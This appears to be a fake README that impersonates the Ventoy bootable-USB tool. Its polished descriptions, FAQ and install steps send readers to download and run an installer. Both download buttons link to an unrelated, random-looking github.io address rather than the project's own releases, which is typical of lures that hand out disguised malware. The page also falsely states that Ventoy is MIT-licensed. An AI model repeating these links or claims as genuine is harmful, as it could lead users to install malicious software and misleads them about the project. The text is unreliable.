# Ventoy – Open-Source Bootable USB Tool for Windows

Ventoy is an open-source bootable USB tool for Windows that installs to a drive once, letting you boot ISO, WIM, IMG, VHD and EFI files just by copying them onto the stick.

<div align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/0/00/Ventoy_Logo.png" alt="Ventoy Logo" width="25%"/>
</div>

<div align="center">

  ![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
  ![License](https://img.shields.io/badge/License-MIT-green)

</div>

<div align="center">
  <h3>Set up your USB once, then boot any ISO you copy onto it</h3>

  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Ventoy-Desktop-App)

</div>

---

## 📑 Table of Contents
- [Overview](#-overview)
- [Features](#-features)
- [Screenshots](#-screenshots)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [Getting Started](#-getting-started)
- [FAQ](#-faq)
- [Support](#-support)
- [License](#-license)

## 🚀 Overview
Ventoy for Windows rethinks how you make a bootable USB. Traditional tools write a single disk image and take over the whole drive, so every new operating system means starting over. Ventoy flips that around: you install it to the USB one time, and from then on the drive behaves like normal storage where each ISO, WIM, IMG, VHD or EFI file you copy over becomes bootable automatically. When you start your PC from the stick, Ventoy displays a menu of everything on it and boots your selection. It covers Legacy BIOS and UEFI, includes Secure Boot support for locked-down machines, and is fully open source with development happening in the open on GitHub — a dependable way to keep IT recovery tools, Linux live systems and Windows installers on one drive.

## ✨ Features
- **No-reformat design** — after the initial Ventoy install, adding a new bootable image is as simple as copying a file; there is nothing else to write or configure.
- **Unified boot menu** — Ventoy scans the drive at startup and lists every ISO and image so you can pick and launch one instantly.
- **Secure Boot support** — with Ventoy Secure Boot, images boot on modern UEFI systems while firmware protection stays on.
- **Universal firmware support** — one Ventoy USB boots on both Legacy BIOS and UEFI hardware, old and new alike.
- **Big-file ready** — exFAT/NTFS support means large Windows installers and disk images fit comfortably, which is a real advantage when people compare Ventoy vs Rufus.

## 📸 Screenshots
<div align="center">
  <img src="https://static0.xdaimages.com/wordpress/wp-content/uploads/wm/2024/08/ventoy-featured-image.jpg?w=1600&h=900&fit=crop" alt="Ventoy Screenshot" width="80%"/>
</div>

## 💻 System Requirements
| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 7 64-bit | Windows 11 64-bit |
| Processor | A modern 64-bit processor | A current multi-core 64-bit processor |
| Memory | 2 GB RAM | 4 GB RAM or more |
| Storage | Minimal free space for the app, plus a USB drive of your chosen size | A high-speed USB 3.0 drive with room for several images |

## 📥 Installation
1. Click the **Download** button above to get the latest version of Ventoy.
2. Run the downloaded installer and follow the on-screen setup steps.
3. Start Ventoy, select your USB drive, and click Install to prepare it.

## 🎯 Getting Started
1. Insert the USB drive you plan to use and open Ventoy on your PC.
2. Select that drive and click **Install**; note this erases the USB, so back up your files beforehand.
3. After installation, open the drive in File Explorer.
4. Drag your ISO, WIM, IMG or VHD files onto the Ventoy partition.
5. Restart, choose the USB as the boot device, and select an image from the Ventoy menu.

## ❓ FAQ
**Is Ventoy free?**
Yes. Ventoy is free and open source; its source code lives on GitHub, so you can review it or build it yourself at no cost.

**Which versions of Windows are supported?**
Ventoy supports 64-bit Windows releases from Windows 7 through Windows 11. For best results, use a version that still receives updates.

**Is Ventoy safe to use?**
As open-source software, Ventoy is transparent and independently auditable, and its Secure Boot option lets it run on protected UEFI systems. Do back up your USB first, since installing Ventoy wipes the drive.

**Is Ventoy better than Rufus?**
They suit different needs: Rufus is great for writing one image at a time, while Ventoy shines when you want several bootable ISOs on a single reusable drive. If flexibility matters most, Ventoy is typically the better fit.

**Is my data secure?**
Everything Ventoy does happens locally, with no account or upload involved. The setup step clears the USB, so save its contents first; files added later simply reside on the drive.

## 🛟 Support
For help with Ventoy, open the built-in Help or Support section inside the app, where you'll find documentation, troubleshooting tips, and contact options. You can also refer to the official Ventoy website for the latest guides, how-to instructions, and support resources.

---

<div align="center">
  <h3>Ready to get started with Ventoy?</h3>

  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Ventoy-Desktop-App)

</div>

## 📄 License
This project is licensed under the **MIT License** — you are free to use, copy, modify, and distribute it. The full MIT License text is provided in the LICENSE file included with the project.

---

<div align="center">
  <sub>Ventoy for Windows — install to a USB once, copy your ISO files on, and boot any of them from a single drive.</sub>
</div>
